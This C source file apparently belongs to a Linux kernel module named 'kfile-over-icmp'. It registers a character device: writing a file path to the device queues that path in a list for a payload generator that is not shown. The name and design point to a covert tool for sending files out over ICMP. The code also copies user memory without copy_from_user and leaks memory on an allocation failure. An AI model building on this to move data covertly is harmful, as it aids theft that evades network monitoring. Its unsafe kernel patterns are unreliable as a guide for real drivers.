#include "chrdev.h"

#include <linux/fs.h>
#include <linux/slab.h>

DEFINE_MUTEX(pending_files_to_be_sent_mutex);

LIST_HEAD(pending_files_to_be_sent);

static int device_open_count = 0;

static int device_open(struct inode* inode, struct file* file);
static int device_release(struct inode* inode, struct file* file);
static ssize_t device_read(struct file *fs, char *buffer, size_t len, loff_t *offset);
static ssize_t device_write(struct file *fs, const char*buffer, size_t len, loff_t *offset);

static struct file_operations _file_ops = {
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release
};

int register_input_chrdev(const char* device_name)
{
    return register_chrdev(0, device_name, &_file_ops);
}

void unregister_input_chrdev(int major_num, const char* device_name) 
{
    unregister_chrdev(major_num, device_name);
}

static ssize_t device_write(struct file *fs, const char *buffer, size_t len, loff_t *offset)
{
    if ((NULL == fs) || (NULL == buffer) || (0 == len)) {
        return -EIO;
    }

    struct file_metadata *new_file_metadata = (struct file_metadata*)kmalloc(sizeof(struct file_metadata), GFP_KERNEL);
    if (NULL == new_file_metadata) {
        return -EIO;
    }

    // allocate space for the path and save it to our file_metadata struct.
    // payload_generator.h is the one responsible for freeing the allocated memory.
    char* file_path = (char*)kmalloc(len, GFP_KERNEL);
    if (NULL == file_path) {
        return -EIO;
    }

    // copy the path to our allocated buffer.
    // NOTE: when a user space uses echo or a similiar tool to write to our device,
    //       the last character of the buffer is a newline. hence, we want to replace
    //       it with a string terminator.
    memcpy(file_path, buffer, len);
    file_path[len - 1] = 0x00;

    new_file_metadata->file_path = file_path;

    mutex_lock(&pending_files_to_be_sent_mutex);
    INIT_LIST_HEAD(&new_file_metadata->l_head);
    // TODO: should be tail or head?
    list_add_tail(&new_file_metadata->l_head, &pending_files_to_be_sent);
    mutex_unlock(&pending_files_to_be_sent_mutex);

    printk(KERN_INFO "kfile-over-icmp: new pending file: %s\n", file_path);

    return len;
}

static int device_open(struct inode* inode, struct file* file)
{
    if (device_open_count) {
        return -EBUSY;
    }

    device_open_count++;
    try_module_get(THIS_MODULE);

    return 0;
}

static int device_release(struct inode* inode, struct file* file)
{
    device_open_count--;
    module_put(THIS_MODULE);

    return 0;
}

static ssize_t device_read(struct file *fs, char *buffer, size_t len, loff_t *offset)
{ 
    return len;
}
